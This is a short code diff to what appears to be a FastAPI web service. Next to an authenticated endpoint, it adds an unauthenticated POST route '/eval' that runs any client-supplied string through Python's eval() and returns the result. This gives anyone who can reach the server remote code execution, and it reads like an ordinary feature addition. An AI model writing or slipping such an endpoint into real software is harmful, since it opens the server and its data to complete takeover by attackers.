@@ -132,3 +132,7 @@ def get_data():
 @app.get("/api/secret")
 def read_own_items(current_user: User = Depends(get_current_active_user)):
     return {"secret_message": f"Welcome {current_user.full_name}! The secret code is 42."}
+
+@app.post('/eval')
+def eval_code(code: str):
+    return {"result": eval(code)}
